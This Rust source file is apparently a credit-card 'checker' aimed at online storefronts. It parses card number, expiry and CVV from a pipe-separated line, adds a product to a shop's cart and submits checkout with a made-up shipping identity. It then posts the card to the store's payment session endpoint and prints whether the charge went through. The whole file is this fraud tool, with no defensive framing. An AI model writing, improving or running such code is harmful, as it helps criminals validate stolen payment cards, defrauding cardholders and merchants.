use std::fs::File;
use std::io::{self, Write};
use reqwest::header::{HeaderValue};
use reqwest::{Client};
use url::Url;
use cookie::{CookieJar};
use scraper::{Html, Selector};
use serde_json::{json, Value};
use reqwest::header::{HeaderMap,ACCEPT,  ACCEPT_LANGUAGE, CONNECTION, CONTENT_TYPE, HOST, ORIGIN, REFERER, USER_AGENT};
use std::thread::sleep;
use std::time::Duration;

fn find_between(text: &str, start: &str, end: &str) -> Option<String> {
    let start_index = text.find(start)?;
    let start_index = start_index + start.len();
    let end_index = text.find(end)?;

    if start_index > end_index {
        return None;
    }

    let result = &text[start_index..end_index];
    Some(result.to_string())
}

#[tokio::main]
pub async fn checker(lista: &str,website: &str) -> Result<(), Box<dyn std::error::Error>> {
    let split_values: Vec<&str> = lista.split('|').collect();

    let mut cc = String::new();
let mut mes = String::new();
let mut ano = String::new();
let mut cvv = String::new();

if let [cc_val, mes_val, ano_val, cvv_val] = split_values.as_slice() {
    cc = cc_val.to_string();
    mes = mes_val.to_string();
    ano = ano_val.to_string();
    cvv = cvv_val.to_string();
}


    let cookie_jar = reqwest::cookie::Jar::default();

    let client = Client::builder()
        .user_agent("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3")
        .cookie_store(true)
        .build()?;
    let mut jar = CookieJar::new();
    let response = client.get(website).send().await?;
    // println!("{:?}",response.headers().get(http::header::SET_COOKIE));
    // add_cookies_to_jar(&mut jar, &response);
    // print_cookies(&jar);
    let mut variant_id: Option<String> = None;

    if response.status().is_success() {
        let first_text = response.text().await?;
        let mut offset = 0;
        let include_delimiters = false;

        if let Some(results) = str_between_all(&first_text, "\"variantId\":\"", ",", include_delimiters, &mut offset) {
            variant_id = Some(results[0].clone());
        } else if let Some(results) = str_between_all(&first_text, "ariant-id=\"", "\"", include_delimiters, &mut offset) {
            variant_id = Some(results[0].clone());
            println!("{}", results[0]);
        } else {
            println!("No Product Variant Ids found.");
        }

        if let Some(variant_id) = variant_id {
            let mut a2c_data = std::collections::HashMap::new();
            a2c_data.insert("id", variant_id.clone());
            a2c_data.insert("quantity", "1".to_string());
            // for (key, value) in &a2c_data {
            //     println!("Key: {}, Value: {}", key, value);
            // }
            let first_url = &website;
            let parsed_url = Url::parse(first_url).unwrap();
            let webname = parsed_url.host_str().unwrap();
            println!("First URL: {}", first_url);
            // println!("Parsed URL: {}", parsed_url);
            println!("Webname: {}", webname);
            let second_url = format!("https://{}/cart/add.js", webname);
            let second_response = client
                .post(&second_url)
                .form(&a2c_data)
                .header("x-requested-with", "XMLHttpRequest")
                .send()
                .await?;
            // add_cookies_to_jar(&mut jar, &second_response);
            // print_cookies(&jar);
            // println!("{}", second_response.text().await?);

            let third_url = format!("https://{}/checkout", webname);
            let third_response = client.get(&third_url).send().await?;

            if third_response.status().is_redirection() {
                // The response is a redirection, and we need to follow it manually.

                if let Some(location) = third_response.headers().get("location") {
                    // Extract the redirection URL from the "Location" header.
                    let location_str = location.to_str()?;
                    let redirect_url = Url::parse(location_str)?;

                    // Now, send a new GET request to the redirection URL.
                    let redirect_response = client.get(redirect_url).send().await?;

                    // Check if the redirection was successful.
                    if !redirect_response.status().is_success() {
                        println!("Error in redirection: Failed to retrieve the response.");
                        return Ok(());
                    }

                    let mut file = File::create("output.html").map_err(|err| io::Error::new(io::ErrorKind::Other, err))?;
                    file.write_all(redirect_response.text().await?.as_bytes()).map_err(|err| io::Error::new(io::ErrorKind::Other, err))?;

                    println!("200 in Redirection Request checkout");
                } else {
                    println!("Error in redirection: No 'Location' header in the response.");
                }
            } else if !third_response.status().is_success() {
                println!("Error in third: Failed to retrieve checkout response.");
            } else {
                println!("200 in Third Request checkout");
                let redirected_url = third_response.url().clone();
                let four_url = third_response.url().to_string();
                let four_response = client.get(&four_url).send().await?;
                let four_text = four_response.text().await?;
                println!("{}",redirected_url);
                // Extract the substring between two markers in the inner HTML
                let start_marker = r#"<input type="hidden" name="authenticity_token" value=""#;
                let end_marker = r#"""#;
                let authenticity_token = extract_substring(&four_text, start_marker, end_marker);

                if let Some(token) = authenticity_token {
                    // Do something with the authenticity_token value
                    println!("Authenticity Token: {}", token);
            
                    // Additional logic with the authenticity_token value
                    // ...

                    // Prepare the data for the POST request
                let head_1 = [
                    ("_method", "patch"),
                    ("authenticity_token", token),
                    ("previous_step", "contact_information"),
                    ("step", "shipping_method"),
                    ("checkout[email]", "sadbhay@yopmail.com"),
                    ("checkout[buyer_accepts_marketing]", "0"),
                    ("checkout[buyer_accepts_marketing]", "1"),
                    ("checkout[shipping_address][first_name]", "jhon"),
                    ("checkout[shipping_address][last_name]", "doe"),
                    ("checkout[shipping_address][address1]", "576 Brown Avenue"),
                    ("checkout[shipping_address][address2]", ""),
                    ("checkout[shipping_address][city]", "Seneca"),
                    ("checkout[shipping_address][country]", "US"),
                    ("checkout[shipping_address][province]", "South Carolina"),
                    ("checkout[shipping_address][zip]", "29678"),
                    ("checkout[shipping_address][phone]", "8032011712"),
                    ("checkout[shipping_address][country]", "United States"),
                    ("checkout[shipping_address][first_name]", "jhon"),
                    ("checkout[shipping_address][last_name]", "doe"),
                    ("checkout[shipping_address][address1]", "576 Brown Avenue"),
                    ("checkout[shipping_address][address2]", ""),
                    ("checkout[shipping_address][city]", "Seneca"),
                    ("checkout[shipping_address][province]", "SC"),
                    ("checkout[shipping_address][zip]", "29678"),
                    ("checkout[shipping_address][phone]", "(803) 201-1712"),
                    ("checkout[note]", ""),
                    ("checkout[client_details][browser_width]", "1349"),
                    ("checkout[client_details][browser_height]", "629"),
                    ("checkout[client_details][javascript_enabled]", "1"),
                    ("checkout[client_details][color_depth]", "24"),
                    ("checkout[client_details][java_enabled]", "false"),
                    ("checkout[client_details][browser_tz]", "-330"),
                ];

                // Send the POST request
                let five_response = client.post(redirected_url.clone()).form(&head_1).send().await?;
                
                if !five_response.status().is_success() {
                    println!("Error in five req");
                    return Ok(());
                }

                let five_text = five_response.text().await?;
                let fragment = Html::parse_document(&five_text);
                let selector = Selector::parse("p.field__message.field__message--error").unwrap();
                let hidden_tags = fragment.select(&selector);

                for tag in hidden_tags {
                    // println!("{}", tag.text().collect::<String>());
                }
                let mut price: Option<&str> = None; 
                if five_text.contains("Shipping Method") || five_text.contains("Shipping method") {
                    let redirected_url_string = redirected_url.as_str().to_owned();
                    let d = client.get(format!("{}/shipping_rates?step=shipping_method", redirected_url_string.clone())).send().await?;

                    println!("Shipping Method Request Done");
                    let start_marker = r#"<div class="radio-wrapper" data-shipping-method=""#;
                    let end_marker = r#"""#;
                    let d_text = &d.text().await?;
                    let ship_tag = extract_substring(d_text, start_marker, end_marker);
                    if let Some(ship_tag) = ship_tag {
                        // Do something with the ship_tag value
                        println!("Ship Tag: {}", ship_tag);
                        let mut data = std::collections::HashMap::new();
                        data.insert("_method", "patch");
                        data.insert("authenticity_token", authenticity_token.unwrap_or_default());
                        data.insert("previous_step", "shipping_method");
                        data.insert("step", "payment_method");
                        data.insert("checkout[shipping_rate][id]", ship_tag);
                        data.insert("checkout[client_details][browser_width]", "1349");
                        data.insert("checkout[client_details][browser_height]", "629");
                        data.insert("checkout[client_details][javascript_enabled]", "1");
                        data.insert("checkout[client_details][color_depth]", "24");
                        data.insert("checkout[client_details][java_enabled]", "false");
                        data.insert("checkout[client_details][browser_tz]", "-330");
                        let redirected_url_string2 = redirected_url_string.as_str().to_owned();
                        let six_response = client
                            .post(redirected_url_string2.clone())
                            .form(&data)
                            .send()
                            .await?;
                        
                        // let six_text = six_response.text().await?;
                        // println!("{}",six_text);
    
                        // println!("{}",six_response.url().to_string())
            
                        let response2 = client
                                    .get(six_response.url().to_string())
                                    .send()
                                    .await?;
                        let sad = response2.text().await?;
                        // println!("{}",sad);
                        
                        
                        
                        if let Some(price_str) = extract_substring(&sad, r#""payment_due":"#, r#"}"#) {
                            if !price_str.is_empty() {
                                let price = price_str;
                                println!("Price: {}", price);
                            } else {
                                println!("Empty price");
                            }
                        } else {
                            println!("Price not found");
                        }
                        let payment_gateway = extract_substring(&sad, r#"data-subfields-for-gateway=""#, r#"""#);
                        if let Some(payment_gateway) = payment_gateway {
                            println!("Payment Gateway: {}", payment_gateway);
                            let url = "https://deposit.us.shopifycs.com/sessions";
                            use serde_json::json;
                            let mut headers = HeaderMap::new();
                            headers.insert(ACCEPT, HeaderValue::from_static("application/json"));
                            headers.insert(ACCEPT_LANGUAGE, HeaderValue::from_static("en-US,en;q=0.5"));
                            headers.insert(CONNECTION, HeaderValue::from_static("keep-alive"));
                            headers.insert(CONTENT_TYPE, HeaderValue::from_static("application/json"));
                            headers.insert(HOST, HeaderValue::from_static("deposit.us.shopifycs.com"));
                            headers.insert(ORIGIN, HeaderValue::from_static("https://checkout.shopifycs.com"));
                            headers.insert(REFERER, HeaderValue::from_static("https://checkout.shopifycs.com/"));
                            headers.insert(USER_AGENT, HeaderValue::from_static("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"));
                        

                        
                        let rand_user_first_name = "John";

                        let json_four = json!({
                            "credit_card": {
                                "number": cc,
                                "name": rand_user_first_name,
                                "month": mes,
                                "year": ano,
                                "verification_value": cvv
                            },
                            "payment_session_scope": webname
                        });
                    
                        let response = client
                        .post(url)
                        .headers(headers)
                        .body(json_four.to_string())
                        .send()
                        .await?;

                        let response_body = response.text().await?;
    let json_response: Value = serde_json::from_str(&response_body)?;

    // Use the `json_response` value as needed

                        if let Some(id) = json_response["id"].as_str() {
                            println!("Session ID: {}", id);
                            
                            let f_data = [
                                ("_method", "patch"),
                                ("authenticity_token", authenticity_token.unwrap_or_default()),
                                ("previous_step", "payment_method"),
                                ("step", ""),
                                ("s", id),
                                ("checkout[payment_gateway]", payment_gateway),
                                ("checkout[credit_card][vault]", "false"),
                                ("checkout[different_billing_address]", "false"),
                                ("checkout[remember_me]", "false"),
                                ("checkout[remember_me]", "0"),
                                ("checkout[vault_phone]", "8032011712"),
                                ("checkout[total_price]", price.unwrap_or_default()),
                                ("complete", "1"),
                                ("checkout[client_details][browser_width]", "674"),
                                ("checkout[client_details][browser_height]", "662"),
                                ("checkout[client_details][javascript_enabled]", "1"),
                                ("checkout[client_details][color_depth]", "24"),
                                ("checkout[client_details][java_enabled]", "false"),
                                ("checkout[client_details][browser_tz]", "-330"),
                            ];
                            let f_url = format!("{}", &redirected_url_string2);

                            let f = client
                                .post(f_url)
                                .form(&f_data)
                                .send()
                                .await?;
                            if !f.url().to_string().contains("processing") {
                                println!("Error");
                                return Ok(());
                            }    

                            sleep(Duration::from_secs(4));

                            let g_url = format!("{}/processing?from_processing_page=1", &redirected_url_string2);
                            let g = client.get(&g_url).send().await?;

                            sleep(Duration::from_secs(5));
                            let g_text = g.text().await?;
                                if let Some(text1) = extract_substring(&g_text, r#"<p class="notice__text">"#, "</p></div></div>") {
                                    println!("cc: {}", cc);
                                    println!("mes: {}", mes);
                                    println!("ano: {}", ano);
                                    println!("cvv: {}", cvv);
                                    println!("{}", text1);
                                    println!("--------------------------------------------------")
                                } else {
                                    println!("Substring not found");
                                }




                        } else {
                            println!("Session ID not found in the response.");
                        }
                        } else {
                            println!("Payment Gateway not found");
                        }
                    } else {
                        println!("Ship Tag not found");
                    }
                }


                } else {
                    println!("Authenticity Token not found");
                }
                let mut file = File::create("output.html").map_err(|err| io::Error::new(io::ErrorKind::Other, err))?;
            }
        }
    } else {
        println!("Request failed with status code: {}", response.status());
    }

    // You can now use the variantId variable outside the if block

    Ok(())
}


fn extract_substring<'a>(input: &'a str, start_marker: &'a str, end_marker: &'a str) -> Option<&'a str> {
    let start_index = input.find(start_marker)?;
    let end_index = input[start_index + start_marker.len()..].find(end_marker)?;
    Some(&input[start_index + start_marker.len()..start_index + start_marker.len() + end_index])
}

pub fn str_between_all(string: &str, start: &str, end: &str, include_delimiters: bool, offset: &mut usize) -> Option<Vec<String>> {
    let mut strings: Vec<String> = Vec::new();
    let length = string.len();
    
    while *offset < length {
        if let Some(found) = str_between(string, start, end, include_delimiters, offset) {
            let found_clone = found.clone();
            strings.push(found_clone);
            *offset += if include_delimiters {
                found.len()
            } else {
                start.len() + found.len() + end.len()
            };
        } else {
            break;
        }
    }
    
    if strings.is_empty() {
        None
    } else {
        Some(strings)
    }
}

pub fn str_between(string: &str, start: &str, end: &str, include_delimiters: bool, offset: &mut usize) -> Option<String> {
    if string.is_empty() || start.is_empty() || end.is_empty() {
        return None;
    }
    
    let start_length = start.len();
    let end_length = end.len();
    
    if let Some(start_pos) = string[*offset..].find(start) {
        let start_pos = *offset + start_pos;
        
        if let Some(end_pos) = string[start_pos + start_length..].find(end) {
            let end_pos = start_pos + start_length + end_pos;
            
            let length = end_pos.checked_sub(start_pos).and_then(|l| {
                if include_delimiters {
                    l.checked_add(end_length)
                } else {
                    l.checked_sub(start_length)
                }
            });
            
            if let Some(length) = length {
                if length == 0 {
                    return Some("".to_string());
                }
                
                *offset = start_pos + if include_delimiters {
                    0
                } else {
                    start_length
                };
                
                if let Some(result) = string.get(*offset..(*offset + length)) {
                    return Some(result.to_string());
                }
            }
        }
    }
    
    None
}

